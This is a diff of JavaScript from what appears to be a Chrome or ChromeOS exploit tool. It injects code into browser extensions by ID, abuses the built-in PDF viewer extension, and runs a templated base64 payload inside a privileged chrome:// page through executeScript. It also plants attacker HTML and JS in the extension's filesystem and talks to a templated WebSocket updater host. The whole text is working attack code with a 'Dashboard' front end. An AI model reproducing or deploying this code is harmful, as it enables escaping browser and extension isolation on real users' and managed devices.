@@ -1,4 +1,4 @@
-(function() {
+(function () {
     if (!opener) {
         opener = window;
     }
@@ -31,17 +31,29 @@
             let globalMap = [];
             function payload_swamp(w, d) {
                 const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
+                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
+                console.log('hi');
                 if (location.origin.includes("chrome-extension://" + pdfId)) {
-                    chrome.tabs.create({url: "chrome://resources/mojo/mojo/public/js/bindings.js"}, function (x) {
-                        chrome.tabs.executeScript(x.id, {code: atob('%%CHROMEPAYLOAD%%')});
-                    });
+                    w.close();
+                    chrome.tabs.getCurrent(function (info) {
+                        chrome.windows.create({
+                            setSelfAsOpener: true,
+                            url: mojoURL
+                        }, function (win) {
+                            const r = win.tabs[0].id;
+                            chrome.tabs.executeScript(r, {code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"`});
+                            
+                        })
+                    })
+
+
                     return;
                 }
                 // console.log(d);
                 // w.setTimeout(function() {
                 const blob_url = new Blob(["alert(1)"], { type: "text/html" });
 
-                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function(fs) {
+                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                     function removeFile(file) {
                         return new Promise(function (resolve, reject) {
                             fs.root.getFile(file, { create: true }, function (entry) {
@@ -50,11 +62,11 @@
                         });
                     }
                     function writeFile(file, data) {
-                        return new Promise((resolve, reject)=>{
-                            fs.root.getFile(file, { create: true }, function(entry) {
-                                entry.remove(function() {
-                                    fs.root.getFile(file, { create: true }, function(entry) {
-                                        entry.createWriter(function(writer) {
+                        return new Promise((resolve, reject) => {
+                            fs.root.getFile(file, { create: true }, function (entry) {
+                                entry.remove(function () {
+                                    fs.root.getFile(file, { create: true }, function (entry) {
+                                        entry.createWriter(function (writer) {
                                             writer.write(new Blob([data]));
                                             resolve(entry.toURL());
                                         })
@@ -73,9 +85,9 @@
                         w.close();
                         return;
                     }
-                    await writeFile('index.js',atob(`%%EXTJS%%`))
+                    await writeFile('index.js', atob(`%%EXTJS%%`))
                     const url = await writeFile('index.html', `${atob('%%EXTHTML%%')}<script src="./index.js"></script>`);
-                    w.close();
+                    // w.close();
                     w.chrome.tabs.create({ url });
                     cleanup();
                 });
@@ -102,7 +114,7 @@
                 <a href="javascript:void(0)" id="activate">Chrome URLs</a>
                 
             `)
-            document.querySelector('#activate').onclick = function ( ) {
+            document.querySelector('#activate').onclick = function () {
                 dbgext(false, pdfId);
             }
             onunload = function () {
@@ -110,12 +122,12 @@
             }
             document.close();
             document.title = "Dashboard";
-            document.querySelector('#updater').onclick = function(ev) {
+            document.querySelector('#updater').onclick = function (ev) {
                 onunload = null;
                 const ws = new WebSocket("ws://%%updaterurl%%");
 
-                ws.onopen = function() {
-                    ws.onmessage = function(ev) {
+                ws.onopen = function () {
+                    ws.onmessage = function (ev) {
                         const received = JSON.parse(ev.data);
                         const savedURL = received.params.request.url;
                         ws.close();
@@ -132,7 +144,7 @@
                 }
 
             }
-            onmessage = function(d) {
+            onmessage = function (d) {
                 if (!globalMap[d.data.uid]) return;
 
                 for (const frame of globalMap) {
@@ -144,7 +156,7 @@
                     }
                 }
             }
-            function dbgext(cleanup, id) {
+            function dbgext(cleanup, id, payload) {
                 let x = id;
                 while (!x) {
                     x = prompt('Extension id?');
@@ -154,7 +166,7 @@
                 }
                 let path = 'manifest.json';
                 let is_pdf = false;
-                let injected = payload_swamp.toString();
+                let injected = payload ?? payload_swamp.toString();
                 if (x === pdfId) {
                     path = "index.html"; // pdf viewer hack
                     is_pdf = true;
@@ -168,7 +180,7 @@
                 document.body.appendChild(ifr);
                 const ifrid = globalMap.push(ifr) - 1;
                 ifr.idx = ifrid;
-                ifr.onload = function() {
+                ifr.onload = function () {
 
                     ifr.contentWindow.postMessage({
                         type: "uidpass", passcode:
@@ -186,7 +198,7 @@
             document.querySelector('#cleanup').onclick = function () {
                 dbgext(true);
             }
-            document.querySelector('#devdbg').onclick = function() {
+            document.querySelector('#devdbg').onclick = function () {
                 var l_canceled = false;
                 const id = setTimeout(function m() {
                     if (l_canceled) return;
@@ -195,7 +207,7 @@
                     clearTimeout(id);
                 });
                 Object.defineProperty(window, 'cancel', {
-                    get: function() {
+                    get: function () {
                         l_canceled = true;
                     }, configurable: true
                 })
